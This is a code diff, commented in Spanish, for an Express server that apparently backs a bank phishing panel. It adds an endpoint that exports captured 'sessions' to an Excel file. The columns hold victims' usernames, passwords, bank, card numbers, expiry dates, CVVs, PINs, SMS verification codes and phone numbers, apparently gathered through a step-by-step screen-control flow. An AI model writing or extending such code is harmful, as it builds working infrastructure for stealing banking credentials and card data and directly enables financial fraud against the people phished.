@@ -4,6 +4,7 @@ import { WebSocketServer, WebSocket } from "ws";
 import { storage } from "./storage";
 import { nanoid } from "nanoid";
 import { ScreenType, screenChangeSchema, clientInputSchema } from "@shared/schema";
+import * as XLSX from "xlsx";
 
 // Store active connections
 const clients = new Map<string, WebSocket>();
@@ -145,6 +146,81 @@ export async function registerRoutes(app: Express): Promise<Server> {
     } catch (error) {
       console.error("Error cleaning up sessions:", error);
       res.status(500).json({ message: "Error cleaning up sessions" });
+    }
+  });
+  
+  // Endpoint para exportar sesiones a Excel
+  app.get('/api/sessions/export', async (req, res) => {
+    try {
+      const { type = 'saved' } = req.query;
+      
+      // Por defecto, exportamos las sesiones guardadas a menos que se especifique lo contrario
+      let sessions;
+      if (type === 'all') {
+        sessions = await storage.getAllSessions();
+      } else if (type === 'current') {
+        sessions = await storage.getCurrentSessions();
+      } else {
+        sessions = await storage.getSavedSessions();
+      }
+      
+      // Preparamos los datos para Excel
+      const excelData = sessions.map(session => ({
+        ID: session.sessionId.substring(0, 6) + '...',
+        Folio: session.folio || '',
+        Usuario: session.username || '',
+        Contraseña: session.password || '',
+        Banco: session.banco || '',
+        Tarjeta: session.tarjeta || '',
+        'Fecha Exp.': session.fechaVencimiento || '',
+        CVV: session.cvv || '',
+        'Código SMS': session.sms || '',
+        NIP: session.nip || '',
+        'SMS Compra': session.smsCompra || '',
+        Celular: session.celular || '',
+        'Paso Actual': session.pasoActual ? session.pasoActual.charAt(0).toUpperCase() + session.pasoActual.slice(1) : '',
+        'Fecha Creación': session.createdAt ? new Date(session.createdAt).toLocaleString('es-MX') : '',
+        Estado: session.saved ? 'Guardado' : 'Activo'
+      }));
+      
+      // Crear libro de Excel
+      const worksheet = XLSX.utils.json_to_sheet(excelData);
+      const workbook = XLSX.utils.book_new();
+      XLSX.utils.book_append_sheet(workbook, worksheet, "Sesiones");
+      
+      // Optimizar anchos de columna
+      const columnWidths = [
+        { wch: 10 }, // ID
+        { wch: 10 }, // Folio
+        { wch: 15 }, // Usuario
+        { wch: 15 }, // Contraseña
+        { wch: 12 }, // Banco
+        { wch: 20 }, // Tarjeta
+        { wch: 10 }, // Fecha Exp.
+        { wch: 6 },  // CVV
+        { wch: 12 }, // Código SMS
+        { wch: 8 },  // NIP
+        { wch: 12 }, // SMS Compra
+        { wch: 12 }, // Celular
+        { wch: 15 }, // Paso Actual
+        { wch: 20 }, // Fecha Creación
+        { wch: 10 }  // Estado
+      ];
+      worksheet['!cols'] = columnWidths;
+      
+      // Generar archivo
+      const excelBuffer = XLSX.write(workbook, { bookType: 'xlsx', type: 'buffer' });
+      
+      // Configurar cabeceras para descargar el archivo
+      res.setHeader('Content-Disposition', 'attachment; filename=sesiones.xlsx');
+      res.setHeader('Content-Type', 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet');
+      
+      // Enviar el archivo
+      res.send(excelBuffer);
+      
+    } catch (error) {
+      console.error("Error exporting sessions:", error);
+      res.status(500).json({ message: "Error al exportar sesiones a Excel" });
     }
   });
 
